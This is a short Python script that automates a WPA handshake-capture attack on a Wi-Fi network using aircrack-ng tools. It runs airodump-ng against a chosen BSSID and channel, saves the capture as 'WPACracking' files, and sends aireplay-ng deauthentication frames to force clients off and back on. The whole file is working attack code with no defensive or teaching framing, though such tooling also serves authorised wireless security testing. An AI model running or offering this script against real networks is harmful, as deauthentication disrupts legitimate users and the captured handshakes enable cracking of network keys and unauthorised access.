#!/usr/bin/python3
import subprocess


def capture(BSSID, CHANNEL, COUNT=1):
    cleanData()

    airodump_capture = f'sudo airodump-ng -c {CHANNEL} --bssid {BSSID} -w ./capture_data/WPACracking wlan0'.split()
    subprocess.Popen(airodump_capture)
    changeChannel(CHANNEL)

    deauth(BSSID, COUNT)
    subprocess.run(['sleep', '5'])

def deauth(BSSID, COUNT):
    sendDeauth = f'sudo aireplay-ng -0 {COUNT} -a {BSSID} wlan0'.split()
    subprocess.run(sendDeauth)

def changeChannel(CHANNEL):
    setChannel = f'sudo iwconfig wlan0 channel {CHANNEL}'.split()
    subprocess.Popen(setChannel)

def cleanData():
    subprocess.call(['rm', '-rf', './capture_data'])
    subprocess.call(['mkdir', './capture_data'])